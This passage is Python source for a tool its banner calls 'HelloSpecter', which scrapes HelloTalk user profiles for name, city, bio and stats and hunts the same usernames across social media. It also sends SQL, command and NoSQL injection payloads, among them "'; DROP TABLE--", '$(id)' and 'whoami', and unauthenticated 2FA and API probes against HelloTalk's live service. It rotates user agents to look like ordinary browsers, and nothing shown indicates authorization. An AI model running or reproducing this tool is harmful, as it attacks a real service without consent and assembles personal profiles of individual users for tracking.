            r'login\s*=\s*[\'"]?[a-zA-Z0-9_]+[\'"]?',
            r'password\s*=\s*[\'"]?[a-zA-Z0-9_]+[\'"]?',
            r'credential',
            r'basic\s+auth',
            r'plaintext'
        ]
        
        weak_auth_found = []
        for pattern in weak_auth_patterns:
            if raw_html and re.search(pattern, raw_html, re.IGNORECASE):
                weak_auth_found.append(pattern)
        
        if weak_auth_found:
            self.results.authentication_flaws.append(AuthenticationFlaw(
                flaw_type='weak_auth',
                severity='MEDIUM',
                description="Weak authentication patterns detected in client-side code",
                evidence=f"Patterns found: {', '.join(weak_auth_found)}",
                remediation="Implement proper server-side authentication with strong password policies."
            ))
            self._log_verbose(f"⚠️ Weak authentication patterns found", Colors.WARNING)
        
        self._log_verbose("Testing for 2FA bypass vulnerabilities...", Colors.AUTH)
        twofa_endpoints = [
            '/api/v1/auth/2fa/verify',
            '/api/v1/auth/2fa/validate',
            '/api/v1/auth/2fa/enable',
            '/api/v1/auth/two-factor'
        ]
        
        for endpoint in twofa_endpoints:
            try:
                test_url = f"{self.api_base}{endpoint}"
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    self.results.authentication_flaws.append(AuthenticationFlaw(
                        flaw_type='bypass_2fa',
                        severity='HIGH',
                        description=f"2FA endpoint {endpoint} accessible without proper authentication",
                        evidence=f"Endpoint returned 200 OK",
                        remediation="Require proper authentication for all 2FA endpoints. Implement rate limiting."
                    ))
                    self._log_verbose(f"⚠️ 2FA endpoint accessible: {endpoint}", Colors.ERROR)
                    break
            except:
                pass
        
        self._log_verbose("Checking for session hijacking vulnerabilities...", Colors.AUTH)
        session_indicators = ['Session ID', 'SID', 'sessionId', 'SESSION', 'PHPSESSID', 'JSESSIONID']
        
        if raw_html:
            found_indicators = [ind for ind in session_indicators if ind.lower() in raw_html.lower()]
            if found_indicators:
                self.results.authentication_flaws.append(AuthenticationFlaw(
                    flaw_type='session_hijacking',
                    severity='MEDIUM',
                    description="Session identifiers found in client-side code",
                    evidence=f"Found indicators: {', '.join(found_indicators[:5])}",
                    remediation="Use secure, HTTP-only cookies with proper SameSite attributes."
                ))
    
    def _test_api_exploitation(self, username: str, raw_html: str = None):
        print(f"\n{Colors.API} 🌐 TESTING API EXPLOITATION")
        print(f"{Colors.HEADER}{'─'*60}")
        
        api_endpoints = [
            '/api/v1/user/profile',
            '/api/v1/user/info',
            '/api/v1/user/settings',
            '/api/v1/user/stats',
            '/api/v1/moments/recommend',
            '/api/v1/moments/comments',
            '/api/v1/partners/search',
            '/api/v1/chat/messages',
            '/api/v1/chat/conversations',
            '/api/v1/notification/list',
            '/api/v1/friend/list',
            '/api/v1/community/posts',
            '/api/v1/language/partner'
        ]
        
        self._log_verbose(f"Testing {len(api_endpoints)} API endpoints...", Colors.API)
        
        for endpoint in api_endpoints:
            test_url = f"{self.api_base}{endpoint}"
            
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and len(str(data)) > 100:
                            sensitive_patterns = ['email', 'phone', 'address', 'location', 'birthday', 'age', 'gender', 'bio', 'password', 'token', 'secret', 'key']
                            exposed_data = []
                            for pattern in sensitive_patterns:
                                if pattern in str(data).lower():
                                    exposed_data.append(pattern)
                            
                            if exposed_data:
                                self.results.api_exploitations.append(APIExploitation(
                                    endpoint=endpoint,
                                    vulnerability_type='data_leak',
                                    severity='HIGH',
                                    exposed_data=exposed_data[:5],
                                    evidence=f"Endpoint accessible without auth. Data: {str(data)[:200]}",
                                    remediation="Implement proper authentication and data filtering."
                                ))
                                self._log_verbose(f"⚠️ Data leak on {endpoint}: {', '.join(exposed_data)}", Colors.ERROR)
                    except:
                        pass
            except:
                pass
            
            try:
                test_params = {'limit': '1000', 'page': '1', 'all': 'true', 'detailed': 'true'}
                for param, value in test_params.items():
                    test_url_with_param = f"{test_url}?{param}={value}"
                    response = self.session.get(test_url_with_param, timeout=5)
                    if response.status_code == 200 and len(response.text) > 2000:
                        self.results.api_exploitations.append(APIExploitation(
                            endpoint=endpoint,
                            vulnerability_type='excessive_data',
                            severity='MEDIUM',
                            exposed_data=['potential excessive data response'],
                            evidence=f"Parameter {param}={value} returned {len(response.text)} bytes",
                            remediation="Implement proper pagination and data filtering."
                        ))
                        self._log_verbose(f"⚠️ Excessive data on {endpoint} with {param}={value}", Colors.WARNING)
                        break
            except:
                pass
            
            time.sleep(0.2)
    
    def _test_insecure_storage(self, username: str, raw_html: str = None):
        print(f"\n{Colors.STORAGE} 💾 TESTING INSECURE STORAGE")
        print(f"{Colors.HEADER}{'─'*60}")
        
        self._log_verbose("Checking for local storage usage...", Colors.STORAGE)
        local_storage_patterns = [
            r'localStorage\.setItem\s*\(',
            r'localStorage\.getItem\s*\(',
            r'sessionStorage\.setItem\s*\(',
            r'sessionStorage\.getItem\s*\(',
            r'window\.localStorage',
            r'window\.sessionStorage'
        ]
        
        if raw_html:
            found_local_storage = []
            for pattern in local_storage_patterns:
                if re.search(pattern, raw_html, re.IGNORECASE):
                    found_local_storage.append(pattern)
            
            if found_local_storage:
                self.results.insecure_storage.append(InsecureStorage(
                    storage_type='local_storage',
                    severity='MEDIUM',
                    exposed_data=['client-side storage usage detected'],
                    evidence=f"Found {len(found_local_storage)} local storage references",
                    remediation="Avoid storing sensitive data in local/session storage. Use secure cookies instead."
                ))
                self._log_verbose(f"⚠️ Local storage usage detected", Colors.WARNING)
        
        self._log_verbose("Checking cookie security...", Colors.STORAGE)
        try:
            response = self.session.get(self.base_url, timeout=10)
            if 'Set-Cookie' in response.headers:
                cookies = response.headers.get('Set-Cookie', '')
                cookie_issues = []
                
                if 'Secure' not in cookies:
                    cookie_issues.append('Missing Secure flag')
                if 'HttpOnly' not in cookies:
                    cookie_issues.append('Missing HttpOnly flag')
                if 'SameSite' not in cookies:
                    cookie_issues.append('Missing SameSite attribute')
                
                if cookie_issues:
                    self.results.insecure_storage.append(InsecureStorage(
                        storage_type='cookies',
                        severity='MEDIUM',
                        exposed_data=cookie_issues,
                        evidence=f"Cookie security issues: {', '.join(cookie_issues)}",
                        remediation="Set Secure, HttpOnly, and SameSite attributes on all cookies."
                    ))
                    self._log_verbose(f"⚠️ Cookie issues: {', '.join(cookie_issues)}", Colors.WARNING)
        except:
            pass
        
        self._log_verbose("Checking for sensitive data in HTML comments...", Colors.STORAGE)
        if raw_html:
            comments = re.findall(r'<!--.*?-->', raw_html, re.DOTALL)
            for comment in comments:
                sensitive_patterns = ['TODO', 'FIXME', 'password', 'secret', 'key', 'token', 'credential']
                for pattern in sensitive_patterns:
                    if pattern.lower() in comment.lower():
                        self.results.insecure_storage.append(InsecureStorage(
                            storage_type='logs',
                            severity='LOW',
                            exposed_data=[pattern],
                            evidence=f"Comment contains '{pattern}': {comment[:100]}",
                            remediation="Remove sensitive information from HTML comments."
                        ))
                        self._log_verbose(f"⚠️ Found '{pattern}' in HTML comments", Colors.WARNING)
                        break
        
        self._log_verbose("Checking cache headers...", Colors.STORAGE)
        try:
            response = self.session.get(self.base_url, timeout=10)
            cache_headers = ['Cache-Control', 'Pragma', 'Expires']
            for header in cache_headers:
                if header in response.headers:
                    value = response.headers[header]
                    if 'no-cache' not in value.lower() and 'no-store' not in value.lower():
                        self.results.insecure_storage.append(InsecureStorage(
                            storage_type='cache',
                            severity='LOW',
                            exposed_data=[f'{header}: {value}'],
                            evidence=f"Cache header allows caching: {header}={value}",
                            remediation="Set Cache-Control: no-cache, no-store, must-revalidate for sensitive data."
                        ))
                        self._log_verbose(f"⚠️ Cache header may allow caching", Colors.WARNING)
                        break
        except:
            pass
    
    def _test_server_side_injection(self, username: str, raw_html: str = None):
        print(f"\n{Colors.INJECTION} 💉 TESTING SERVER-SIDE INJECTION")
        print(f"{Colors.HEADER}{'─'*60}")
        
        injection_points = []
        
        if raw_html:
            soup = BeautifulSoup(raw_html, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    injection_points.append(action)
                
                for input_field in form.find_all('input'):
                    name = input_field.get('name', '')
                    if name:
                        injection_points.append(name)
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if '?' in href:
                    parsed = urlparse(href)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        for param in params:
                            injection_points.append(param)
        
        self._log_verbose("Testing for SQL Injection vulnerabilities...", Colors.INJECTION)
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE--",
            "' UNION SELECT NULL--",
            "admin'--",
            "1' OR '1'='1'",
            "' AND 1=1--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*"
        ]
        
        injection_tested = False
        for point in injection_points[:10]:
            for payload in sql_payloads:
                try:
                    test_url = f"{self.api_base}/search"
                    params = {'q': payload, 'search': payload, 'query': payload}
                    
                    for param, value in params.items():
                        response = self.session.get(test_url, params={param: value}, timeout=5)
                        
                        sql_error_patterns = [
                            r'SQL syntax', r'MySQL', r'Warning.*mysql', r'PostgreSQL',
                            r'SQLite', r'ORA-', r'Microsoft OLE DB', r'DB2', r'ODBC',
                            r'SQL Server', r'You have an error in your SQL syntax',
                            r'Division by zero', r'Unknown column', r'Invalid column',
                            r'Unclosed quotation mark', r'Incorrect syntax near'
                        ]
                        
                        for pattern in sql_error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.results.server_side_injections.append(ServerSideInjection(
                                    injection_type='sql',
                                    severity='CRITICAL',
                                    parameter=param,
                                    payload=payload,
                                    evidence=f"SQL error detected: {re.search(pattern, response.text, re.IGNORECASE).group(0)}",
                                    remediation="Use parameterized queries and proper input validation."
                                ))
                                self._log_verbose(f"❌ SQL Injection detected on parameter '{param}'", Colors.ERROR)
                                injection_tested = True
                                break
                        
                        if injection_tested:
                            break
                    
                    if injection_tested:
                        break
                except:
                    pass
                
                time.sleep(0.1)
            
            if injection_tested:
                break
        
        self._log_verbose("Testing for Command Injection vulnerabilities...", Colors.INJECTION)
        cmd_payloads = ['; ls -la', '| ls -la', '&& whoami', '|| whoami', '`id`', '$(id)', '; ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1']
        
        for payload in cmd_payloads[:5]:
            try:
                response = self.session.get(f"{self.api_base}/search", params={'q': payload}, timeout=5)
                
                cmd_error_patterns = [r'whoami', r'id=', r'uid=', r'gid=', r'groups=', r'PING', r'ping statistics']
                
                for pattern in cmd_error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.results.server_side_injections.append(ServerSideInjection(
                            injection_type='command',
                            severity='CRITICAL',
                            parameter='q',
                            payload=payload,
                            evidence=f"Command execution pattern detected: {pattern}",
                            remediation="Avoid using system commands. Use proper APIs instead."
                        ))
                        self._log_verbose(f"❌ Command Injection detected with payload '{payload}'", Colors.ERROR)
                        break
            except:
                pass
        
        self._log_verbose("Testing for NoSQL Injection vulnerabilities...", Colors.INJECTION)
        nosql_payloads = ['{$gt: ""}', '{$ne: ""}', '{$exists: true}', '{$or: [{"email": ""}, {"email": {"$gt": ""}}]}', '{"$where": "function() { return 1 == 1 }"}']
        
        for payload in nosql_payloads[:3]:
            try:
                response = self.session.get(f"{self.api_base}/search", params={'q': payload}, timeout=5)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    self.results.server_side_injections.append(ServerSideInjection(
                        injection_type='nosql',
                        severity='HIGH',
                        parameter='q',
                        payload=payload,
                        evidence=f"Potential NoSQL injection with payload '{payload}'",
                        remediation="Sanitize user input. Use parameterized queries for NoSQL."
                    ))
                    self._log_verbose(f"⚠️ Potential NoSQL Injection with payload '{payload}'", Colors.WARNING)
                    break
            except:
                pass
        
        if not self.results.server_side_injections:
            self.results.server_side_injections.append(ServerSideInjection(
                injection_type='none_found',
                severity='INFO',
                parameter='N/A',
                payload='N/A',
                evidence='No injection vulnerabilities detected in initial testing',
                remediation="Continue monitoring and maintain security best practices."
            ))
            self._log_verbose("✅ No injection vulnerabilities detected", Colors.SUCCESS)
    
    def _calculate_overall_risk(self):
        risk_scores = {'CRITICAL': 5, 'HIGH': 4, 'MEDIUM': 3, 'LOW': 2, 'INFO': 1}
        
        total_score = 0
        max_score = 0
        
        for flaw in self.results.authentication_flaws:
            total_score += risk_scores.get(flaw.severity, 0)
            max_score += 5
        
        for api in self.results.api_exploitations:
            total_score += risk_scores.get(api.severity, 0)
            max_score += 5
        
        for storage in self.results.insecure_storage:
            total_score += risk_scores.get(storage.severity, 0)
            max_score += 5
        
        for injection in self.results.server_side_injections:
            total_score += risk_scores.get(injection.severity, 0)
            max_score += 5
        
        if max_score > 0:
            risk_percentage = (total_score / max_score) * 100
        else:
            risk_percentage = 0
        
        if risk_percentage >= 80:
            self.results.overall_risk = "CRITICAL"
        elif risk_percentage >= 60:
            self.results.overall_risk = "HIGH"
        elif risk_percentage >= 40:
            self.results.overall_risk = "MEDIUM"
        elif risk_percentage >= 20:
            self.results.overall_risk = "LOW"
        else:
            self.results.overall_risk = "LOW"
        
        self.results.cvss_scores = {
            'authentication': 8.5 if any(f.severity in ['CRITICAL', 'HIGH'] for f in self.results.authentication_flaws) else 3.5,
            'api': 7.5 if any(a.severity in ['CRITICAL', 'HIGH'] for a in self.results.api_exploitations) else 2.5,
            'storage': 6.5 if any(s.severity in ['CRITICAL', 'HIGH'] for s in self.results.insecure_storage) else 2.0,
            'injection': 9.0 if any(i.severity in ['CRITICAL', 'HIGH'] for i in self.results.server_side_injections) else 1.0
        }
    
    def _print_security_summary(self):
        print(f"\n{Colors.HEADER}{'═'*80}")
        print(f"{Colors.SHIELD} 🛡️ SECURITY TEST SUMMARY")
        print(f"{Colors.HEADER}{'═'*80}")
        
        print(f"\n{Colors.AUTH}🔐 Authentication Flaws: {len(self.results.authentication_flaws)}")
        for flaw in self.results.authentication_flaws:
            severity_color = Colors.ERROR if flaw.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if flaw.severity == 'MEDIUM' else Colors.INFO
            print(f"{severity_color}  [{flaw.severity}] {flaw.flaw_type}: {flaw.description[:60]}...")
        
        print(f"\n{Colors.API}🌐 API Exploitations: {len(self.results.api_exploitations)}")
        for api in self.results.api_exploitations:
            severity_color = Colors.ERROR if api.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if api.severity == 'MEDIUM' else Colors.INFO
            print(f"{severity_color}  [{api.severity}] {api.vulnerability_type} on {api.endpoint}")
        
        print(f"\n{Colors.STORAGE}💾 Insecure Storage: {len(self.results.insecure_storage)}")
        for storage in self.results.insecure_storage:
            severity_color = Colors.ERROR if storage.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if storage.severity == 'MEDIUM' else Colors.INFO
            print(f"{severity_color}  [{storage.severity}] {storage.storage_type}: {storage.remediation[:50]}...")
        
        print(f"\n{Colors.INJECTION}💉 Server-Side Injection: {len(self.results.server_side_injections)}")
        for injection in self.results.server_side_injections:
            if injection.injection_type != 'none_found':
                severity_color = Colors.ERROR if injection.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if injection.severity == 'MEDIUM' else Colors.INFO
                print(f"{severity_color}  [{injection.severity}] {injection.injection_type}: {injection.evidence[:60]}...")
        
        risk_colors = {'CRITICAL': Colors.ERROR, 'HIGH': Colors.ERROR, 'MEDIUM': Colors.WARNING, 'LOW': Colors.INFO}
        risk_color = risk_colors.get(self.results.overall_risk, Colors.INFO)
        
        print(f"\n{Colors.HEADER}{'─'*60}")
        print(f"{risk_color}📊 OVERALL RISK LEVEL: {self.results.overall_risk}{Colors.RESET}")
        print(f"{Colors.HEADER}{'═'*80}")

# ============================================================================
# 🛠️ HELLOTALK PROFILE SCANNER
# ============================================================================

class HelloTalkProfileScanner:
    def __init__(self):
        self.base_url = "https://www.hellotalk.com"
        self.partners_base = f"{self.base_url}/en/partners"
        self.ua = UserAgent()
        self.session = requests.Session()
        self.security_tester = AdvancedSecurityTester()
        self.username_hunter = UsernameHunter(auto_clean=True)
        self.scanned_profiles: Dict[str, HelloTalkProfile] = {}
        
        self._setup_logging()
        self._update_headers()
        self._print_banner()
    
    def _setup_logging(self):
        self.logger = logging.getLogger('HelloTalkScanner')
        self.logger.setLevel(logging.INFO)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter(f'{Colors.DIM}%(asctime)s{Colors.RESET} - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)
    
    def _update_headers(self):
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Referer': self.base_url,
        })
    
    def _print_banner(self):
        banner = f"""
{Colors.HEADER}{'═'*80}
{Colors.SCANNER}🔍HelloSpecter - HELLOTALK SECURITY SCANNER & PARTNERS OSINT BY SYLHETYHACKVENGER (THE-ERROR808) {Colors.SHIELD}
{Colors.HEADER}{'═'*80}
{Colors.INFO} 📡 Target: {self.base_url}/en/partners/{{username}}
{Colors.AUTH} 🔐 Authentication Flaw Testing
{Colors.API} 🌐 API Exploitation Testing
{Colors.STORAGE} 💾 Insecure Storage Testing
{Colors.INJECTION} 💉 Server-Side Injection Testing
{Colors.OSINT} 🕵️ Social Media Hunting (Auto-Clean)
{Colors.HEADER}{'═'*80}
"""
        print(banner)
    
    def get_profile_url(self, username: str) -> str:
        username = username.strip('/ @')
        return f"{self.partners_base}/{username}"
    
    def clean_text(self, text: str) -> str:
        if not text:
            return ""
        text = re.sub(r'\s+', ' ', text)
        text = re.sub(r'[\r\n\t]+', ' ', text)
        text = re.sub(r'Learning Progress\d+Users Helped\d+Conversations[\d.]+Avg Rating[\d.]+Active Days\d+Weekly Hours\d+Streak Days\d+', '', text)
        text = re.sub(r'Related TopicsSimilar PartnersLanguage Exchange.*$', '', text)
        return text.strip()
    
    def fetch_profile_page(self, username: str, max_retries: int = 3) -> Optional[requests.Response]:
        url = self.get_profile_url(username)
        
        for attempt in range(max_retries):
            try:
                self._update_headers()
                time.sleep(random.uniform(0.5, 1.5))
                response = self.session.get(url, timeout=20)
                
                if response.status_code == 200:
                    return response
                elif response.status_code == 404:
                    self.logger.error(f"{Colors.ERROR}❌ Profile not found: {username}")
                    return None
                elif response.status_code == 429:
                    self.logger.warning(f"{Colors.WARNING}⚠️ Rate limited, waiting...")
                    time.sleep(5)
            except Exception as e:
                self.logger.warning(f"{Colors.WARNING}⚠️ Attempt {attempt+1} failed: {e}")
                time.sleep((attempt + 1) * 2)
        
        return None
    
    def extract_profile_data(self, html: str, username: str) -> HelloTalkProfile:
        soup = BeautifulSoup(html, 'html.parser')
        all_text = soup.get_text()
        clean_text = self.clean_text(all_text)
        
        profile = HelloTalkProfile(
            username=username,
            profile_url=self.get_profile_url(username),
            raw_html_hash=hashlib.md5(html.encode()).hexdigest(),
            raw_html=html,
            response_size=len(html)
        )
        
        # 1. NAME
        title = soup.find('title')
        if title:
            title_text = title.get_text()
            match = re.match(r'^([^-]+)', title_text)
            if match:
                profile.name = match.group(1).strip()
        
        # 2. BIO
        about_section = soup.find('div', class_=re.compile(r'about|bio|description'))
        if about_section:
            bio_text = about_section.get_text()
            bio_text = self.clean_text(bio_text)
            bio_text = re.sub(r'^About\s+[^\n]+\s*', '', bio_text)
            if bio_text:
                profile.bio = bio_text
        
        if not profile.bio:
            bio_match = re.search(r'About\s+[^\n]+\s*\n\s*([^\n]+)', clean_text)
            if bio_match:
                profile.bio = bio_match.group(1).strip()
        
        # 3. LOCATION
        location_match = re.search(r'Location\s*[:]*\s*([^,\n]+(?:,\s*[^,\n]+)?)', clean_text, re.IGNORECASE)
        if location_match:
            location = location_match.group(1).strip()
            profile.location = location
            if ',' in location:
                parts = location.split(',')
                profile.city = parts[0].strip()
                profile.country = parts[1].strip() if len(parts) > 1 else None
            else:
                profile.country = location
        
        # 4. LANGUAGES
        native_match = re.search(r'Native\s*Language\s*[:]*\s*([^\n]+)', clean_text, re.IGNORECASE)
        if native_match:
            lang = native_match.group(1).strip()
            lang = re.sub(r'\d+.*$', '', lang)
            if lang and len(lang) < 30:
                profile.native_language = [lang]
        
        learning_match = re.search(r'Learning\s*Language\s*[:]*\s*([^\n]+)', clean_text, re.IGNORECASE)
        if learning_match:
            lang_text = learning_match.group(1).strip()
            level_match = re.search(r'([^-–—]+)[-–—](.+)', lang_text)
            if level_match:
                profile.learning_language = [level_match.group(1).strip()]
                profile.learning_level = level_match.group(2).strip()
            else:
                lang = re.sub(r'\d+.*$', '', lang_text)
                if lang and len(lang) < 30:
                    profile.learning_language = [lang]
        
        # 5. INTERESTS
        interests_section = soup.find('div', class_=re.compile(r'interests|hobbies|about'))
        if interests_section:
            interests_text = interests_section.get_text()
            interests_match = re.search(r'Interests\s*&\s*Hobbies\s*([^\n]+)', interests_text, re.IGNORECASE)
            if interests_match:
                interests_raw = interests_match.group(1).strip()
                profile.interests = [i.strip() for i in interests_raw.split() if i.strip()]
        
        if not profile.interests:
            interests_text_match = re.search(r'Interests\s*&\s*Hobbies\s*([^\n]+)', clean_text, re.IGNORECASE)
            if interests_text_match:
                interests_raw = interests_text_match.group(1).strip()
                profile.interests = [i.strip() for i in interests_raw.split() if i.strip()]
        
        # 6. PROFESSION
        profession_match = re.search(r'Profession\s*[:]*\s*([^\n]+)', clean_text, re.IGNORECASE)
        if profession_match:
            profile.profession = profession_match.group(1).strip()
        
        # 7. STATS
        stats_patterns = {
            'followers': r'(\d+[.,]?\d*)\s*(?:Followers|followers)',
            'following': r'(\d+[.,]?\d*)\s*(?:Following|following)',
            'posts': r'(\d+[.,]?\d*)\s*(?:Posts|posts)',
            'moments': r'(\d+[.,]?\d*)\s*(?:Moments|moments)',
            'community_feedback': r'(\d+[.,]?\d*)\s*(?:Community Feedback|community feedback)',
            'language_exchange': r'(\d+[.,]?\d*)\s*(?:Language Exchange|language exchange)',
            'partner_support': r'(\d+[.,]?\d*)\s*(?:Partner Support|partner support)',
            'learning_consistency': r'(\d+[.,]?\d*)\s*(?:Learning Consistency|learning consistency)',
            'active_days': r'(\d+[.,]?\d*)\s*(?:Active Days|active days)',
            'weekly_hours': r'(\d+[.,]?\d*)\s*(?:Weekly Hours|weekly hours)',
            'streak_days': r'(\d+[.,]?\d*)\s*(?:Streak Days|streak days)',
            'avg_rating': r'(\d+\.?\d*)\s*(?:Avg Rating|avg rating|Average Rating)',
            'users_helped': r'(\d+[.,]?\d*)\s*(?:Users Helped|users helped)',
            'conversations': r'(\d+[.,]?\d*)\s*(?:Conversations|conversations)',
            'learning_progress': r'(\d+[.,]?\d*)\s*(?:Learning Progress|learning progress)',
        }
        
        for key, pattern in stats_patterns.items():
            match = re.search(pattern, clean_text, re.IGNORECASE)
            if match:
                value = match.group(1).replace(',', '').replace('.', '')
                try:
                    if key == 'avg_rating':
                        setattr(profile.stats, key, float(match.group(1).replace(',', '')))
                    else:
                        setattr(profile.stats, key, int(value) if value else 0)
                except:
                    pass
        
        # 8. LEVEL
        level_match = re.search(r'Level\s*[:]*\s*(\d+)', clean_text, re.IGNORECASE)
        if level_match:
            profile.stats.level = int(level_match.group(1))
        
        # 9. VERIFICATION & PREMIUM
        if 'Verified' in clean_text or 'verified' in clean_text:
            profile.is_verified = True
        if 'Premium' in clean_text or 'VIP' in clean_text:
            profile.is_premium = True
        
        # 10. COMPLETENESS
        fields_to_check = [
            'name', 'bio', 'native_language', 'learning_language',
            'location', 'country', 'city', 'interests', 'profession'
        ]
        
        completeness = 0
        for field in fields_to_check:
            val = getattr(profile, field)
            if val:
                if isinstance(val, list) and len(val) > 0:
                    completeness += 1
                elif isinstance(val, str) and val.strip():
                    completeness += 1
                elif not isinstance(val, (str, list)) and val:
                    completeness += 1
        
        profile.data_completeness = f"{completeness}/{len(fields_to_check)}"
        profile.fetch_status = 'success'
        
        return profile
    
    def scan_profile(self, username: str, test_security: bool = True, hunt_social: bool = True) -> Optional[HelloTalkProfile]:
        username = username.strip('/ @')
        
        self.logger.info(f"{Colors.INFO}🔍 Scanning: {Colors.HIGHLIGHT}{username}")
        
        response = self.fetch_profile_page(username)
        if not response:
            self.logger.error(f"{Colors.ERROR}❌ Failed to fetch: {username}")
            return None
        
        profile = self.extract_profile_data(response.text, username)
        
        if test_security:
            self.logger.info(f"{Colors.SHIELD}🛡️ Running comprehensive security tests...")
            security_results = self.security_tester.run_comprehensive_security_test(username, response.text)
            profile.security_test_results = security_results
        
        if hunt_social:
            self.logger.info(f"{Colors.OSINT}🕵️ Hunting social media presence...")
            social_results = self.username_hunter.hunt(username)
            profile.social_media_presence = social_results
            print(self.username_hunter.format_hunt_results(social_results))
        
        self.scanned_profiles[username] = profile
        
        self.logger.info(f"{Colors.SUCCESS}✅ Scanned: {Colors.HIGHLIGHT}{username} {Colors.DIM}({profile.data_completeness})")
        
        return profile
    
    def generate_comprehensive_report(self, profile: HelloTalkProfile) -> str:
        if not profile:
            return f"{Colors.ERROR}❌ No data available"
        
        stats = profile.stats
        sec = profile.security_test_results
        
        report = []
        report.append(f"\n{Colors.HEADER}{'═'*80}")
        report.append(f"{Colors.HIGHLIGHT}📄 HELLOTALK COMPREHENSIVE REPORT")
        report.append(f"{Colors.HEADER}{'═'*80}")
        
        report.append(f"\n{Colors.INFO}👤 PROFILE INFORMATION")
        report.append(f"{Colors.HEADER}{'─'*60}")
        report.append(f"{Colors.INFO}  Username: {Colors.RESET}@{profile.username}")
        report.append(f"{Colors.INFO}  Name: {Colors.RESET}{profile.name or 'N/A'}")
        report.append(f"{Colors.INFO}  Location: {Colors.RESET}{profile.location or 'N/A'}")
        report.append(f"{Colors.INFO}  Native Language: {Colors.RESET}{', '.join(profile.native_language) or 'N/A'}")
        report.append(f"{Colors.INFO}  Learning Language: {Colors.RESET}{', '.join(profile.learning_language) or 'N/A'}")
        report.append(f"{Colors.INFO}  Verified: {Colors.RESET}{'✅ Yes' if profile.is_verified else '❌ No'}")
        report.append(f"{Colors.INFO}  Premium: {Colors.RESET}{'✅ Yes' if profile.is_premium else '❌ No'}")
        
        report.append(f"\n{Colors.STATS}📊 STATISTICS")
        report.append(f"{Colors.HEADER}{'─'*60}")
        report.append(f"{Colors.INFO}  Level: {Colors.RESET}{stats.level}")
        report.append(f"{Colors.INFO}  Followers: {Colors.RESET}{stats.followers:,}")
        report.append(f"{Colors.INFO}  Following: {Colors.RESET}{stats.following:,}")
        report.append(f"{Colors.INFO}  Conversations: {Colors.RESET}{stats.conversations:,}")
        report.append(f"{Colors.INFO}  Avg Rating: {Colors.RESET}{stats.avg_rating}")
        report.append(f"{Colors.INFO}  Learning Progress: {Colors.RESET}{stats.learning_progress}%")
        
        report.append(f"\n{Colors.SHIELD}🛡️ SECURITY OVERVIEW")
        report.append(f"{Colors.HEADER}{'─'*60}")
        risk_colors = {'CRITICAL': Colors.ERROR, 'HIGH': Colors.ERROR, 'MEDIUM': Colors.WARNING, 'LOW': Colors.INFO}
        report.append(f"{risk_colors.get(sec.overall_risk, Colors.INFO)}  Overall Risk Level: {sec.overall_risk}{Colors.RESET}")
        report.append(f"{Colors.INFO}  Scan Timestamp: {sec.scan_timestamp}")
        
        report.append(f"\n{Colors.AUTH}🔐 AUTHENTICATION FLAWS ({len(sec.authentication_flaws)})")
        report.append(f"{Colors.HEADER}{'─'*60}")
        if sec.authentication_flaws:
            for flaw in sec.authentication_flaws:
                severity_color = Colors.ERROR if flaw.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if flaw.severity == 'MEDIUM' else Colors.INFO
                report.append(f"{severity_color}  [{flaw.severity}] {flaw.flaw_type}:")
                report.append(f"{Colors.DIM}     {flaw.description}")
                report.append(f"{Colors.DIM}     Evidence: {flaw.evidence}")
                report.append(f"{Colors.DIM}     Remediation: {flaw.remediation}")
        else:
            report.append(f"{Colors.SUCCESS}  ✅ No authentication flaws detected")
        
        report.append(f"\n{Colors.API}🌐 API EXPLOITATIONS ({len(sec.api_exploitations)})")
        report.append(f"{Colors.HEADER}{'─'*60}")
        if sec.api_exploitations:
            for api in sec.api_exploitations:
                severity_color = Colors.ERROR if api.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if api.severity == 'MEDIUM' else Colors.INFO
                report.append(f"{severity_color}  [{api.severity}] {api.vulnerability_type} on {api.endpoint}:")
                report.append(f"{Colors.DIM}     Exposed Data: {', '.join(api.exposed_data)}")
                report.append(f"{Colors.DIM}     Evidence: {api.evidence[:100]}...")
                report.append(f"{Colors.DIM}     Remediation: {api.remediation}")
        else:
            report.append(f"{Colors.SUCCESS}  ✅ No API exploitations detected")
        
        report.append(f"\n{Colors.STORAGE}💾 INSECURE STORAGE ({len(sec.insecure_storage)})")
        report.append(f"{Colors.HEADER}{'─'*60}")
        if sec.insecure_storage:
            for storage in sec.insecure_storage:
                severity_color = Colors.ERROR if storage.severity in ['CRITICAL', 'HIGH'] else Colors.WARNING if storage.severity == 'MEDIUM' else Colors.INFO
                report.append(f"{severity_color}  [{storage.severity}] {storage.storage_type}:")
                report.append(f"{Colors.DIM}     Exposed: {', '.join(storage.exposed_data)}")
                report.append(f"{Colors.DIM}     Evidence: {storage.evidence[:100]}...")
                report.append(f"{Colors.DIM}     Remediation: {storage.remediation}")
        else:
            report.append(f"{Colors.SUCCESS}  ✅ No insecure storage issues detected")
        
        report.append(f"\n{Colors.INJECTION}💉 SERVER-SIDE INJECTION ({len(sec.server_side_injections)})")
